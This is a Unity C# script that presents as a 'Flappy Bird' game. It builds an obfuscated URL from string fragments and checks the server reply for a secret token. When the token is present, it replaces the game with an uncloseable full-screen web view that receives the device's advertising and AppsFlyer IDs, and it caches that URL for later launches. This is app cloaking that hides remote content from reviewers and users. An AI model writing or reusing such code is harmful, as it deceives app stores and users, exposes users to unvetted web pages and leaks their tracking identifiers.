using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;

public class MainLC : MonoBehaviour
{    
    public List<string> splitters;
    [HideInInspector] public string oLCn = "";
    [HideInInspector] public string tLCn = "";

    

    private void Awake()
    {
        if (PlayerPrefs.GetInt("idfaLC") != 0)
        {
            Application.RequestAdvertisingIdentifierAsync(
            (string advertisingId, bool trackingEnabled, string error) =>
            { oLCn = advertisingId; });
        }
    }      
    

    private void circularLCform(string UrlLCallude, string NamingLC = "", int pix = 70)
    {
        UniWebView.SetAllowInlinePlay(true);
        var _rangesLC = gameObject.AddComponent<UniWebView>();
        _rangesLC.SetToolbarDoneButtonText("");
        switch (NamingLC)
        {
            case "0":
                _rangesLC.SetShowToolbar(true, false, false, true);
                break;
            default:
                _rangesLC.SetShowToolbar(false);
                break;
        }
        _rangesLC.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);
        _rangesLC.OnShouldClose += (view) =>
        {
            return false;
        };
        _rangesLC.SetSupportMultipleWindows(true);
        _rangesLC.SetAllowBackForwardNavigationGestures(true);
        _rangesLC.OnMultipleWindowOpened += (view, windowId) =>
        {
            _rangesLC.SetShowToolbar(true);

        };
        _rangesLC.OnMultipleWindowClosed += (view, windowId) =>
        {
            switch (NamingLC)
            {
                case "0":
                    _rangesLC.SetShowToolbar(true, false, false, true);
                    break;
                default:
                    _rangesLC.SetShowToolbar(false);
                    break;
            }
        };
        _rangesLC.OnOrientationChanged += (view, orientation) =>
        {
            _rangesLC.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);
        };
        _rangesLC.OnPageFinished += (view, statusCode, url) =>
        {
            if (PlayerPrefs.GetString("UrlLCallude", string.Empty) == string.Empty)
            {
                PlayerPrefs.SetString("UrlLCallude", url);
            }
        };
        _rangesLC.Load(UrlLCallude);
        _rangesLC.Show();
    }

    private void Start()
    {
        if (Application.internetReachability != NetworkReachability.NotReachable)
        {
            if (PlayerPrefs.GetString("UrlLCallude", string.Empty) != string.Empty)
            {
                circularLCform(PlayerPrefs.GetString("UrlLCallude"));
            }
            else
            {
                foreach (string n in splitters)
                {
                    tLCn += n;
                }
                StartCoroutine(IENUMENATORLC());
            }
        }
        else
        {
            MovingLC();
        }
    }

    private IEnumerator IENUMENATORLC()
    {
        using (UnityWebRequest lc = UnityWebRequest.Get(tLCn))
        {

            yield return lc.SendWebRequest();
            if (lc.isNetworkError)
            {
                MovingLC();
            }
            int packetLC = 7;
            while (PlayerPrefs.GetString("glrobo", "") == "" && packetLC > 0)
            {
                yield return new WaitForSeconds(1);
                packetLC--;
            }
            try
            {
                if (lc.result == UnityWebRequest.Result.Success)
                {
                    if (lc.downloadHandler.text.Contains("LprCvnBVdvqd"))
                    {

                        try
                        {
                            var subs = lc.downloadHandler.text.Split('|');
                            circularLCform(subs[0] + "?idfa=" + oLCn, subs[1], int.Parse(subs[2]));
                        }
                        catch
                        {
                            circularLCform(lc.downloadHandler.text + "?idfa=" + oLCn + "&gaid=" + AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + PlayerPrefs.GetString("glrobo", ""));
                        }
                    }
                    else
                    {
                        MovingLC();
                    }
                }
                else
                {
                    MovingLC();
                }
            }
            catch
            {
                MovingLC();
            }
        }
    }

    private void MovingLC()
    {
        Screen.orientation = ScreenOrientation.Portrait;
        SceneManager.LoadScene("Flappy Bird");
    }
}
